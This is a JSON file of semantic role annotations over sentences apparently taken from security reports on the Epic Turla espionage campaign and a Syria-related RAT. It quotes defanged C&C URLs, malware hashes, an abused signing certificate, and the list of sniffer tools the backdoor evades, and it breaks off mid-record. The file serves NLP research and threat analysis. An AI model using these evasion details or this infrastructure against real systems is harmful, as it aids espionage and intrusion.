"ARG1": {"text": "a RAT command - and - control server"}}}, " Not only is it\nexceptionally targeted, but it is also not a commonly available RAT": {"is": {"V": {"text": "is", "index": 2}, "ARG1": {"text": "it"}, "ARG2": {"text": "exceptionally targeted"}}, "targeted": {"ARGM-MNR": {"text": "exceptionally"}, "V": {"text": "targeted", "index": 5}}, "is_2": {"ARG1": {"text": "it"}, "V": {"text": "is", "index": 9}, "ARGM-ADV": {"text": "also"}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "a commonly available RAT"}}}, "\n      Use of \u201ccrypters\u201d to obscure the binary": {"obscure": {"V": {"text": "obscure", "index": 6}, "ARG1": {"text": "the binary"}}}, "\n      The seeding attempts to obtain a \u2018private\u2019 Facebook identity from RSS through social engineering": {"seeding": {"V": {"text": "seeding", "index": 1}, "ARG1": {"text": "attempts"}}, "obtain": {"V": {"text": "obtain", "index": 4}, "ARG1": {"text": "a \u2018 private \u2019 Facebook identity"}, "ARG2": {"text": "from RSS through social engineering"}}}, " However, we note that the attacker also attempts to social\nengineer the identity of individuals working with RSS, by requesting a personal Facebook page": {"note": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "we"}, "V": {"text": "note", "index": 3}, "ARG1": {"text": "that the attacker also attempts to social engineer the identity of individuals working with RSS , by requesting a personal Facebook page"}}, "attempts": {"ARG0": {"text": "the attacker"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "attempts", "index": 8}, "ARG1": {"text": "to social engineer the identity of individuals working with RSS , by requesting a personal Facebook page"}}, "working": {"ARG0": {"text": "individuals"}, "V": {"text": "working", "index": 16}, "ARG3": {"text": "with RSS"}}, "requesting": {"ARG0": {"text": "the attacker"}, "V": {"text": "requesting", "index": 21}, "ARG1": {"text": "a personal Facebook page"}}}, "\n\nThe attack took the form of an unsolicited e-mail containing a download link to a decoy file": {"took": {"ARG0": {"text": "The attack"}, "V": {"text": "took", "index": 2}, "ARG1": {"text": "the form of an unsolicited e - mail containing a download link to a decoy file"}}, "containing": {"ARG0": {"text": "e - mail"}, "V": {"text": "containing", "index": 11}, "ARG1": {"text": "a download link"}}}, "\n\fWe are aware of only one previous case in Syria in which e-mail was used to transmit data, and that we believed was\nregime linked": {"are": {"ARG1": {"text": "We"}, "V": {"text": "are", "index": 1}, "ARG2": {"text": "aware of only one previous case in Syria in which e - mail was used to transmit data , and that we believed was regime linked"}}, "was": {"V": {"text": "was", "index": 15}}, "used": {"ARGM-LOC": {"text": "only one previous case in Syria"}, "R-ARGM-LOC": {"text": "in which"}, "ARG1": {"text": "e - mail"}, "V": {"text": "used", "index": 16}, "ARG2": {"text": "to transmit data"}}, "transmit": {"ARG0": {"text": "e - mail"}, "V": {"text": "transmit", "index": 18}, "ARG1": {"text": "data"}}, "believed": {"ARG0": {"text": "we"}, "V": {"text": "believed", "index": 24}, "ARG1": {"text": "was regime linked"}}, "was_2": {"V": {"text": "was", "index": 25}}, "linked": {"ARG1": {"text": "regime"}, "V": {"text": "linked", "index": 27}}}, " This behaviour\nstrongly suggests that the function of this malware is to serve as a beacon": {"suggests": {"ARG0": {"text": "This behaviour"}, "ARGM-MNR": {"text": "strongly"}, "V": {"text": "suggests", "index": 3}, "ARG1": {"text": "that the function of this malware is to serve as a beacon"}}, "is": {"ARG1": {"text": "the function of this malware"}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "to serve as a beacon"}}, "serve": {"V": {"text": "serve", "index": 12}, "ARG1": {"text": "as a beacon"}}}, " For instance,\nanother tool often uploaded by the attackers to the victim's machine is \"winrs.exe\":\n<list>\n\fName: winrs.exe\nMD5: 1369fee289fe7798a02cde100a5e91d8\n</list>\nThis is an UPX packed binary, which contains the genuine \"dnsquery.exe\" tool from Microsoft, unpacked\nMD5: c0c03b71684eb0545ef9182f5f9928ca": {"uploaded": {"ARG1": {"text": "another tool"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "uploaded", "index": 6}, "ARG0": {"text": "by the attackers"}, "ARGM-ADV": {"text": "to the victim 's machine"}}, "is": {"ARGM-DIS": {"text": "For instance"}, "ARG1": {"text": "another tool often uploaded by the attackers to the victim 's machine"}, "V": {"text": "is", "index": 15}, "ARG2": {"text": "winrs.exe"}}, "is_2": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 21}, "ARG2": {"text": "an UPX packed binary , which contains the genuine \" dnsquery.exe \" tool from Microsoft , unpacked MD5 : c0c03b71684eb0545ef9182f5f9928ca"}}, "packed": {"ARG2": {"text": "UPX"}, "V": {"text": "packed", "index": 24}}, "contains": {"ARG0": {"text": "an UPX packed binary"}, "R-ARG0": {"text": "which"}, "V": {"text": "contains", "index": 28}, "ARG1": {"text": "the genuine \" dnsquery.exe \" tool from Microsoft , unpacked MD5 : c0c03b71684eb0545ef9182f5f9928ca"}}}, "\n\nThe CVE-2013-5065 exploit allows the backdoor to achieve administrator privileges on the system and run\nunrestricted": {"allows": {"ARG0": {"text": "The CVE-2013 - 5065 exploit"}, "V": {"text": "allows", "index": 5}, "ARG1": {"text": "the backdoor to achieve administrator privileges on the system and run unrestricted"}}, "achieve": {"V": {"text": "achieve", "index": 9}, "ARG1": {"text": "administrator privileges"}, "ARGM-LOC": {"text": "on the system"}}, "run": {"V": {"text": "run", "index": 16}, "ARG1": {"text": "unrestricted"}}}, " The primary backdoor used in the Epic attacks is also known as\n\"WorldCupSec\", \"TadjMakhal\", \"Wipbot\" or \"Tavdig\"": {"used": {"ARGM-ADV": {"text": "backdoor"}, "V": {"text": "used", "index": 3}, "ARGM-LOC": {"text": "in the Epic attacks"}}, "is": {"V": {"text": "is", "index": 8}}, "known": {"ARG1": {"text": "The primary backdoor used in the Epic attacks"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "known", "index": 10}, "ARG2": {"text": "as \" WorldCupSec \" , \" TadjMakhal \" , \" Wipbot \" or \" Tavdig \""}}}, " The replies are sent back to the\nC&C through the same channel": {"are": {"V": {"text": "are", "index": 2}}, "sent": {"ARG1": {"text": "The replies"}, "V": {"text": "sent", "index": 3}, "ARG2": {"text": "back to the C&C"}, "ARGM-DIR": {"text": "through the same channel"}}}, " We have\nlocated several versions of this script which attempt various exploitation mechanisms": {"have": {"V": {"text": "have", "index": 1}}, "located": {"ARG0": {"text": "We"}, "V": {"text": "located", "index": 2}, "ARG1": {"text": "several versions of this script which attempt various exploitation mechanisms"}}, "attempt": {"ARG0": {"text": "this script"}, "R-ARG0": {"text": "which"}, "V": {"text": "attempt", "index": 9}, "ARG1": {"text": "various exploitation mechanisms"}}}, " The backdoor extracted from the Java exploits has the following C&C hardcoded inside:\n<list>\nwww.arshinmalalan[.]com/themes/v6/templates/css/in.php\n</list>\nThis C&C is still online at the moment although it redirects to a currently suspended page at\n\"hxxp://busandcoachdirectory.com[.]au\"": {"extracted": {"V": {"text": "extracted", "index": 2}, "ARG2": {"text": "from the Java exploits"}}, "has": {"ARG0": {"text": "The backdoor extracted from the Java exploits"}, "V": {"text": "has", "index": 7}, "ARG1": {"text": "the following C&C hardcoded inside"}}, "following": {"V": {"text": "following", "index": 9}}, "hardcoded": {"ARG0": {"text": "C&C"}, "V": {"text": "hardcoded", "index": 11}, "ARGM-DIR": {"text": "inside"}}, "is": {"ARG1": {"text": "This C&C"}, "V": {"text": "is", "index": 16}, "ARGM-TMP": {"text": "still/ at the moment"}, "ARG2": {"text": "online"}, "ARGM-ADV": {"text": "although it redirects to a currently suspended page at \" hxxp://busandcoachdirectory.com[.]au \""}}, "redirects": {"ARG0": {"text": "it"}, "V": {"text": "redirects", "index": 24}, "ARG2": {"text": "to a currently suspended page"}, "ARGM-LOC": {"text": "at \" hxxp://busandcoachdirectory.com[.]au"}}, "suspended": {"ARGM-TMP": {"text": "currently"}, "V": {"text": "suspended", "index": 28}, "ARG1": {"text": "page"}}}, "\n\nThe huge network commanded by the Epic Turla attackers serves multiple purposes": {"commanded": {"ARG1": {"text": "The huge network"}, "V": {"text": "commanded", "index": 3}, "ARG0": {"text": "by the Epic Turla attackers"}}, "serves": {"ARG0": {"text": "The huge network commanded by the Epic Turla attackers"}, "V": {"text": "serves", "index": 9}, "ARG1": {"text": "multiple purposes"}}}, " The mothership also work as the exploitation servers\nused in the watering hole attacks, delivering Java, IE or fake applications to the victim": {"work": {"ARG0": {"text": "The mothership"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "work", "index": 3}, "ARG1": {"text": "as the exploitation servers used in the watering hole attacks , delivering Java , IE or fake applications to the victim"}}, "used": {"ARG1": {"text": "the exploitation servers"}, "V": {"text": "used", "index": 8}, "ARGM-LOC": {"text": "in the watering hole attacks"}}, "watering": {"V": {"text": "watering", "index": 11}}, "delivering": {"ARG0": {"text": "The mothership"}, "V": {"text": "delivering", "index": 15}, "ARG1": {"text": "Java , IE or fake applications"}, "ARG2": {"text": "to the victim"}}}, " This takes advantage of social engineering to trick the user into running a fake\nFlash Player (MD5: 030f5fdb78bfc1ce7b459d3cc2cf1877):\n\n<figure></figure>\n\n\nIn at least one case, they tried to trick the user into downloading and running a fake Microsoft Security\nEssentials app (MD5: 89b0f1a3a667e5cd43f5670e12dba411):\n<figure></figure>\n\fThe fake application is signed by a valid digital certificate from Sysprint AG:\n<list>\nSerial number: 00 c0 a3 9e 33 ec 8b ea 47 72 de 4b dc b7 49 bb 95 Thumbprint: 24 21 58 64 f1 28 97 2b 26\n22 17 2d ee 62 82 46 07 99 ca 46\n</list>\n\n\n<figure></figure>\n<caption>Valid signature from Sysprint AG on Epic dropper</caption>\n\fThis file was distributed from the Ministry of Foreign Affairs of Tajikistan's website, at\n\"hxxp://mfa[.]tj/upload/security.php\"": {"takes": {"V": {"text": "takes", "index": 1}, "ARG1": {"text": "advantage"}, "ARG2": {"text": "of social engineering"}, "ARG0": {"text": "to trick the user into"}, "ARGM-PRP": {"text": "running a fake Flash Player ( MD5"}}, "trick": {"V": {"text": "trick", "index": 7}, "ARG1": {"text": "the user"}, "ARG2": {"text": "into running a fake Flash Player ( MD5"}}, "running": {"V": {"text": "running", "index": 11}, "ARG1": {"text": "a fake Flash Player ( MD5"}}, "was": {"V": {"text": "was", "index": 24}}, "distributed": {"ARG1": {"text": "This file"}, "V": {"text": "distributed", "index": 25}, "ARG2": {"text": "from the Ministry of Foreign Affairs of Tajikistan 's website"}}}, " The communication protocol uses\n\n<figure></figure>\nrequests in the C&C replies, which the malware decrypts and processes": {"uses": {"ARG0": {"text": "The communication protocol"}, "V": {"text": "uses", "index": 3}, "ARG1": {"text": "requests in the C&C replies , which the malware decrypts and processes"}}}, "\nThe configuration can also be updated on the fly by the attackers, via the C&C": {"can": {"V": {"text": "can", "index": 2}}, "be": {"ARG1": {"text": "The configuration"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "be", "index": 4}, "ARG2": {"text": "updated on the fly by the attackers"}, "ARGM-MNR": {"text": "via the C&C"}}, "updated": {"ARG1": {"text": "The configuration"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "updated", "index": 5}, "ARG2": {"text": "on the fly by the attackers"}, "ARGM-MNR": {"text": "via the C&C"}}}, " Here's a look at one of the encrypted server\nreplies:\n<figure></figure>\n\fOnce a victim is infected and \"checks in\" with the server, the attackers send a template of commands:\n\n<figure></figure>\n\n\nNext, the attackers try to move through the victim's network using pre-defined or collected passwords:\n<figure></figure>\n\fListing all .doc files recursively is also a common \"theme\":\n\n<figure></figure>\n\n\nIn total, we have decoded several hundreds of these command packages delivered to the victims, providing\nan unique insight into the inner workings of the attackers": {"'s": {"ARG2": {"text": "Here"}, "V": {"text": "'s", "index": 1}, "ARG1": {"text": "a look at one of the encrypted server replies"}}, "encrypted": {"V": {"text": "encrypted", "index": 8}, "ARG1": {"text": "server replies"}}, "have": {"V": {"text": "have", "index": 16}}, "decoded": {"ARGM-DIS": {"text": "In total"}, "ARG0": {"text": "we"}, "V": {"text": "decoded", "index": 17}, "ARG1": {"text": "several hundreds of these command packages delivered to the victims"}, "ARGM-PRD": {"text": "providing an unique insight into the inner workings of the attackers"}}, "delivered": {"ARG1": {"text": "several hundreds of these command packages"}, "V": {"text": "delivered", "index": 24}, "ARG2": {"text": "to the victims"}}, "providing": {"V": {"text": "providing", "index": 29}, "ARG1": {"text": "an unique insight into the inner workings of the attackers"}}}, "\n</section>\n<section>\n<heading>The Epic command-and-control infrastructure</heading>\n\nThe Epic backdoors are commanded by a huge network of hacked servers that deliver command and\ncontrol functionality": {"are": {"V": {"text": "are", "index": 3}}, "commanded": {"ARG1": {"text": "The Epic backdoors"}, "V": {"text": "commanded", "index": 4}, "ARG0": {"text": "by a huge network of hacked servers that deliver command and control functionality"}}, "hacked": {"V": {"text": "hacked", "index": 10}, "ARG1": {"text": "servers"}}, "deliver": {"ARG0": {"text": "hacked servers"}, "R-ARG0": {"text": "that"}, "V": {"text": "deliver", "index": 13}, "ARG1": {"text": "command and control functionality"}}, "control": {"ARG0": {"text": "hacked servers"}, "R-ARG0": {"text": "that"}, "V": {"text": "control", "index": 16}, "ARG1": {"text": "functionality"}}}, "\n\n<figure></figure>\n</section>\n<section>\n\n<heading>Lateral movement and upgrade to more sophisticated backdoors</heading>\n\nOnce a victim is compromised, the attackers upload several tools that are used for lateral movement": {"is": {"V": {"text": "is", "index": 3}}, "compromised": {"ARG1": {"text": "a victim"}, "V": {"text": "compromised", "index": 4}}, "upload": {"ARGM-TMP": {"text": "Once a victim is compromised"}, "ARG0": {"text": "the attackers"}, "V": {"text": "upload", "index": 8}, "ARG1": {"text": "several tools that are used for lateral movement"}}, "are": {"V": {"text": "are", "index": 12}}, "used": {"ARG1": {"text": "several tools"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 13}, "ARG2": {"text": "for lateral movement"}}}, "\n</section>\n<section>\n<heading>Victim statistics</heading>\n\fOn some of the C&C servers used in the Epic attacks, we were able to identify detailed victim statistics,\nwhich were saved for debugging purposes by the attackers": {"used": {"ARG1": {"text": "the C&C servers"}, "V": {"text": "used", "index": 6}, "ARGM-LOC": {"text": "in the Epic attacks"}}, "were": {"ARGM-LOC": {"text": "On some of the C&C servers used in the Epic attacks"}, "ARG1": {"text": "we"}, "V": {"text": "were", "index": 13}, "ARG2": {"text": "able to identify detailed victim statistics , which were saved for debugging purposes by the attackers"}}, "identify": {"ARG0": {"text": "we"}, "V": {"text": "identify", "index": 16}, "ARG1": {"text": "detailed victim statistics , which were saved for debugging purposes by the attackers"}}, "were_2": {"V": {"text": "were", "index": 22}}, "saved": {"ARG1": {"text": "detailed victim statistics"}, "R-ARG1": {"text": "which"}, "V": {"text": "saved", "index": 23}, "ARG2": {"text": "for debugging purposes by the attackers"}}, "debugging": {"V": {"text": "debugging", "index": 25}, "ARG1": {"text": "purposes"}}}, " If the\nvictim is interesting, they get upgraded to the Turla Carbon system": {"is": {"ARG1": {"text": "the victim"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "interesting"}}, "get": {"ARGM-ADV": {"text": "If the victim is interesting"}, "ARG1": {"text": "they"}, "V": {"text": "get", "index": 7}, "ARG2": {"text": "upgraded to the Turla Carbon system"}}, "upgraded": {"ARGM-ADV": {"text": "If the victim is interesting"}, "ARG1": {"text": "they"}, "V": {"text": "upgraded", "index": 8}, "ARG2": {"text": "to the Turla Carbon system"}}}, "\n\nAnother more recent version attempts to exploit Oracle Sun Java and Adobe Flash Player:\n\n\n<figure></figure>\n\n<caption>Java and Flash Player exploitation scripts</caption>\n\nAlthough the Flash Player exploits couldn't be retrieved, we did manage to obtain the Java exploits:\n<table>\n                      Name               MD5\n                      allj.html          536eca0defc14eff0a38b64c74e03c79\n                      allj.jar           f41077c4734ef27dec41c89223136cf8\n                      allj64.html        15060a4b998d8e288589d31ccd230f86\n                      allj64.jar         e481f5ea90d684e5986e70e6338539b4\n                      lstj.jar           21cbc17b28126b88b954b3b123958b46\n                      lstj.html          acae4a875cd160c015adfdea57bd62c4\n</table>\n\fThe Java files exploit a popular vulnerability, CVE-2012-1723, in various configurations": {"attempts": {"ARG0": {"text": "Another more recent version"}, "V": {"text": "attempts", "index": 4}, "ARG1": {"text": "to exploit Oracle Sun Java and Adobe Flash Player"}}, "exploit": {"ARG0": {"text": "Another more recent version"}, "V": {"text": "exploit", "index": 6}, "ARG1": {"text": "Oracle Sun Java and Adobe Flash Player"}}, "exploit_2": {"ARG0": {"text": "The Java files"}, "V": {"text": "exploit", "index": 18}, "ARG1": {"text": "a popular vulnerability , CVE-2012 - 1723 ,"}, "ARGM-LOC": {"text": "in various configurations"}}}, " For instance, the\nmotherships function as both exploitation sites and command and control panels for the malware": {}, "\n\nThe payload dropped by these Java exploits is the following:\n<list>\nMD5: d7ca9cf72753df7392bfeea834bcf992\n</list>\nThe Java exploit use a special loader that attempts to inject the final Epic backdoor payload into\nexplorer.exe": {"dropped": {"ARG1": {"text": "The payload"}, "V": {"text": "dropped", "index": 2}, "ARG0": {"text": "by these Java exploits"}}, "exploits": {"ARG1": {"text": "these Java"}, "V": {"text": "exploits", "index": 6}}, "is": {"ARG1": {"text": "The payload dropped by these Java exploits"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "the following"}}, "following": {"V": {"text": "following", "index": 9}}, "use": {"ARG0": {"text": "The Java"}, "ARGM-MNR": {"text": "exploit"}, "V": {"text": "use", "index": 14}, "ARG1": {"text": "a special loader that attempts to inject the final Epic backdoor payload"}, "ARG2": {"text": "into explorer.exe"}}, "attempts": {"ARG0": {"text": "a special loader"}, "R-ARG0": {"text": "that"}, "V": {"text": "attempts", "index": 19}, "ARG1": {"text": "to inject the final Epic backdoor payload into explorer.exe"}}, "inject": {"ARG0": {"text": "a special loader"}, "R-ARG0": {"text": "that"}, "V": {"text": "inject", "index": 21}, "ARG1": {"text": "the final Epic"}, "ARG2": {"text": "backdoor payload into explorer.exe"}}}, "\n\nThis is an Epic backdoor which connects to the following C&Cs, with a generic internal ID of 1156fd22-\n3443-4344-c4ffff:\n<list>\nhxxp://homaxcompany[.]com/components/com_sitemap/\nhxxp://www.hadilotfi[.]com/wp-content/themes/profile/\n</list>\nA full list with all the C&C server URLs that we recovered from the samples can be found in the technical\nAppendix": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "an Epic backdoor which connects to the following C&Cs , with a generic internal ID of 1156fd22- 3443 - 4344-c4ffff : A full list with all the C&C server URLs that we recovered from the samples can be found in the technical Appendix"}}, "connects": {"ARG0": {"text": "an Epic backdoor"}, "R-ARG0": {"text": "which"}, "V": {"text": "connects", "index": 6}, "ARG1": {"text": "to the following C&Cs"}, "ARGM-MNR": {"text": "with a generic internal ID of 1156fd22- 3443 - 4344-c4ffff : A full list with all the C&C server URLs that we recovered from the samples can be found in the technical Appendix"}}, "server": {"V": {"text": "server", "index": 30}, "ARG1": {"text": "URLs"}}, "recovered": {"ARG1": {"text": "all the C&C server URLs"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "we"}, "V": {"text": "recovered", "index": 34}, "ARG2": {"text": "from the samples"}}, "can": {"V": {"text": "can", "index": 38}}, "be": {"V": {"text": "be", "index": 39}}, "found": {"ARG1": {"text": "all/ we recovered from the samples"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "found", "index": 40}, "ARGM-LOC": {"text": "in the technical Appendix"}}}, " This is used to gain a foothold and validate the high profile victim": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "used to gain a foothold and validate the high profile victim"}}, "used": {"V": {"text": "used", "index": 2}, "ARG1": {"text": "to gain a foothold and validate the high profile victim"}}, "gain": {"ARG0": {"text": "This"}, "V": {"text": "gain", "index": 4}, "ARG1": {"text": "a foothold and validate the high profile victim"}}, "validate": {"V": {"text": "validate", "index": 8}, "ARG1": {"text": "the high profile victim"}}}, "\n\nThe file is a .NET application that contains an encrypted resource": {"is": {"ARG1": {"text": "The file"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a .NET application that contains an encrypted resource"}}, "contains": {"ARG0": {"text": "a .NET application"}, "R-ARG0": {"text": "that"}, "V": {"text": "contains", "index": 7}, "ARG1": {"text": "an encrypted resource"}}, "encrypted": {"V": {"text": "encrypted", "index": 9}, "ARG1": {"text": "resource"}}}, "\n\nThe backdoor attempts to identify the following processes and, if found, it will terminate itself:\n<list>\n      tcpdump.exe\n      windump.exe\n      ethereal.exe\n      wireshark.exe\n      ettercap.exe\n      snoop.exe\n      dsniff.exe\n</list>\nIt contains an internal unique ID, which is used to identify the victim to the C&C": {"attempts": {"ARG0": {"text": "The backdoor"}, "V": {"text": "attempts", "index": 2}, "ARG1": {"text": "to identify the following processes"}}, "identify": {"ARG0": {"text": "The backdoor"}, "V": {"text": "identify", "index": 4}, "ARG1": {"text": "the following processes"}}, "following": {"V": {"text": "following", "index": 6}, "ARG1": {"text": "processes"}}, "found": {"V": {"text": "found", "index": 11}}, "will": {"ARGM-ADV": {"text": "if found"}, "V": {"text": "will", "index": 14}, "ARG1": {"text": "terminate itself"}}, "terminate": {"ARGM-ADV": {"text": "if found"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "terminate", "index": 15}, "ARG1": {"text": "itself"}}, "contains": {"ARG0": {"text": "It"}, "V": {"text": "contains", "index": 19}, "ARG1": {"text": "an internal unique ID , which is used to identify the victim to the C&C"}}, "is": {"ARG1": {"text": "an internal unique ID"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 26}, "ARG2": {"text": "used to identify the victim to the C&C"}}, "used": {"ARG1": {"text": "an internal unique ID"}, "R-ARG1": {"text": "which"}, "V": {"text": "used", "index": 27}, "ARG2": {"text": "to identify the victim to the C&C"}}, "identify_2": {"ARG0": {"text": "which"}, "V": {"text": "identify", "index": 29}, "ARG1": {"text": "the victim"}, "ARG2": {"text": "to the C&C"}}}, "\n\nThrough monitoring, we were able to capture a large amount of commands sent to the victims by the\nattackers, providing an unique view into this operation": {"were": {"ARGM-MNR": {"text": "Through monitoring"}, "ARG1": {"text": "we"}, "V": {"text": "were", "index": 4}, "ARG2": {"text": "able to capture a large amount of commands sent to the victims by the attackers , providing an unique view into this operation"}}, "capture": {"ARG0": {"text": "we"}, "V": {"text": "capture", "index": 7}, "ARG1": {"text": "a large amount of commands sent to the victims by the attackers"}}, "sent": {"ARG1": {"text": "a large amount of commands"}, "V": {"text": "sent", "index": 13}, "ARG2": {"text": "to the victims"}, "ARG0": {"text": "by the attackers"}}, "providing": {"ARG0": {"text": "we"}, "V": {"text": "providing", "index": 21}, "ARG1": {"text": "an unique view"}, "ARG2": {"text": "into this operation"}}}, "\n\nHere's how the big picture looks like:\n<figure></figure>\n\f<caption>Epic Turla lifecycle</caption>\n\nThe first level of command and control proxies generally talk to a second level of proxies, which in turn,\ntalk to the \"mothership\" server": {"'s": {"ARG2": {"text": "Here"}, "V": {"text": "'s", "index": 1}, "ARG1": {"text": "how the big picture looks like"}}, "looks": {"ARGM-MNR": {"text": "how"}, "ARG0": {"text": "the big picture"}, "V": {"text": "looks", "index": 6}, "ARG1": {"text": "like"}}, "talk": {"ARG0": {"text": "The first level of command and control proxies"}, "ARGM-ADV": {"text": "generally"}, "V": {"text": "talk", "index": 18}, "ARG2": {"text": "to a second level of proxies , which in turn , talk to the \" mothership \" server"}}, "talk_2": {"ARG0": {"text": "a second level of proxies"}, "R-ARG0": {"text": "which"}, "ARGM-ADV": {"text": "in turn"}, "V": {"text": "talk", "index": 30}, "ARG2": {"text": "to the \" mothership \" server"}}}, "\n<list>\nSize: 275,968 bytes\nMD5: e9580b6b13822090db018c320e80865f\nCompiled: Thu Nov 08 11:05:35 2012\n\nanother example:\n\nSize: 218,112 bytes\nMD5: 071d3b60ebec2095165b6879e41211f2\nCompiled: Thu Nov 08 11:04:39 2012\n</list>\nThis backdoor is more sophisticated and belongs to the next level of cyber-espionage tools called the\n\"Carbon system\" or Cobra by the Turla attackers": {"is": {"ARG1": {"text": "This backdoor"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "more sophisticated"}}, "belongs": {"ARG0": {"text": "This backdoor"}, "V": {"text": "belongs", "index": 6}, "ARG1": {"text": "to the next level of cyber - espionage tools called the \" Carbon system \" or Cobra by the Turla attackers"}}, "called": {"ARG1": {"text": "cyber - espionage tools"}, "V": {"text": "called", "index": 16}, "ARG2": {"text": "the \" Carbon system \" or Cobra"}, "ARG0": {"text": "by the Turla attackers"}}}, "\n\nDuring the first C&C call, the backdoor sends a pack with the victim's system information": {"sends": {"ARGM-TMP": {"text": "During the first C&C call"}, "ARG0": {"text": "the backdoor"}, "V": {"text": "sends", "index": 8}, "ARG1": {"text": "a pack"}, "ARG2": {"text": "with the victim 's system information"}}}, " In time, as\nthe attackers gain confidence, this is upgraded to more sophisticated backdoors, such as the\nCarbon/Cobra system": {"gain": {"ARG0": {"text": "the attackers"}, "V": {"text": "gain", "index": 6}, "ARG1": {"text": "confidence"}}, "is": {"V": {"text": "is", "index": 10}}, "upgraded": {"ARGM-TMP": {"text": "In time"}, "ARGM-ADV": {"text": "as the attackers gain confidence"}, "ARG1": {"text": "this"}, "V": {"text": "upgraded", "index": 11}, "ARG2": {"text": "to more sophisticated backdoors , such as the Carbon / Cobra system"}}}, "\n</section>\n<section>\n<heading>The watering hole attacks</heading>\n\nCurrently, the Epic attackers run a vast network of watering holes that target visitors with surgical\nprecision": {"run": {"ARGM-TMP": {"text": "Currently"}, "ARG0": {"text": "the Epic attackers"}, "V": {"text": "run", "index": 5}, "ARG1": {"text": "a vast network of watering holes that target visitors with surgical precision"}}, "watering": {"V": {"text": "watering", "index": 10}, "ARG0": {"text": "holes"}}, "target": {"ARG0": {"text": "a vast network of watering holes"}, "R-ARG0": {"text": "that"}, "V": {"text": "target", "index": 13}, "ARG2": {"text": "visitors"}, "ARGM-MNR": {"text": "with surgical precision"}}}, "\n\nFor some of the C&C servers, the attackers implemented RSA encryption for the C&C logs, which makes it\nimpossible to decrypt them": {"implemented": {"ARGM-GOL": {"text": "For some of the C&C servers"}, "ARG0": {"text": "the attackers"}, "V": {"text": "implemented", "index": 9}, "ARG1": {"text": "RSA encryption"}, "ARGM-PNC": {"text": "for the C&C logs"}, "ARGM-ADV": {"text": "which makes it impossible to decrypt them"}}, "makes": {"ARG0": {"text": "the C&C logs"}, "R-ARG0": {"text": "which"}, "V": {"text": "makes", "index": 18}, "ARG1": {"text": "it impossible to decrypt them"}}, "decrypt": {"V": {"text": "decrypt", "index": 22}, "ARG1": {"text": "them"}}}, " The mothership server is generally a VPS, which runs the Control panel\nsoftware used to interact with the victims": {"is": {"ARG1": {"text": "The mothership server"}, "V": {"text": "is", "index": 3}, "ARGM-ADV": {"text": "generally"}, "ARG2": {"text": "a VPS , which runs the Control panel software used to interact with the victims"}}, "runs": {"ARG0": {"text": "a VPS"}, "R-ARG0": {"text": "which"}, "V": {"text": "runs", "index": 9}, "ARG1": {"text": "the Control panel software used to interact with the victims"}}, "used": {"V": {"text": "used", "index": 14}}, "interact": {"ARG0": {"text": "the Control panel software"}, "V": {"text": "interact", "index": 16}, "ARG1": {"text": "with the victims"}}}, " In this case, we found they targeted two\n\franges belonging to:\n<list>\n      \"Country A\" - Federal Government Network\n      \"Country B\" - Government Telecommunications and Informatics Services Network\n</list>\nIt should be noted though, the fact that the attackers were targeting these ranges doesn't necessarily mean\nthey also got infected": {"found": {"ARGM-LOC": {"text": "In this case"}, "ARG0": {"text": "we"}, "V": {"text": "found", "index": 5}, "ARG1": {"text": "they targeted two ranges belonging to"}}, "targeted": {"ARG0": {"text": "they"}, "V": {"text": "targeted", "index": 7}, "ARG1": {"text": "two ranges belonging to"}}, "belonging": {"ARG0": {"text": "two ranges"}, "V": {"text": "belonging", "index": 10}, "ARG1": {"text": "to"}}, "should": {"V": {"text": "should", "index": 14}}, "be": {"V": {"text": "be", "index": 15}}, "noted": {"ARG1": {"text": "It"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "noted", "index": 16}, "ARGM-DIS": {"text": "though"}}, "were": {"V": {"text": "were", "index": 24}}, "targeting": {"ARG0": {"text": "the attackers"}, "V": {"text": "targeting", "index": 25}, "ARG1": {"text": "these ranges"}}, "does": {"V": {"text": "does", "index": 28}}, "mean": {"ARG0": {"text": "the fact that the attackers were targeting these ranges"}, "ARGM-NEG": {"text": "n't"}, "ARGM-ADV": {"text": "necessarily"}, "V": {"text": "mean", "index": 31}, "ARG1": {"text": "they also got infected"}}, "got": {"ARG0": {"text": "they"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "got", "index": 34}, "ARG2": {"text": "infected"}}, "infected": {"ARG1": {"text": "they"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "infected", "index": 35}}}, "\n\nThere are other indications that the attackers are not native English language speakers:\n<list>\n      Password it\u00b4s wrong!\n      Count successful more MAX\n      File is not exists\n      File is exists for edit\n</list>\nThe sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an\nupgraded backdoor, has the compilation code page language set to \"LANG_RUSSIAN\"": {"are": {"V": {"text": "are", "index": 1}, "ARG1": {"text": "other indications that the attackers are not native English language speakers : The sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an upgraded backdoor , has the compilation code page language set to \" LANG_RUSSIAN \""}}, "are_2": {"ARG1": {"text": "the attackers"}, "V": {"text": "are", "index": 7}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "native English language speakers"}}, "was": {"V": {"text": "was", "index": 18}}, "delivered": {"ARG1": {"text": "The sample e9580b6b13822090db018c320e80865f"}, "R-ARG1": {"text": "that"}, "V": {"text": "delivered", "index": 19}, "ARG2": {"text": "to several Epic victims"}, "ARGM-PRP": {"text": "as an upgraded 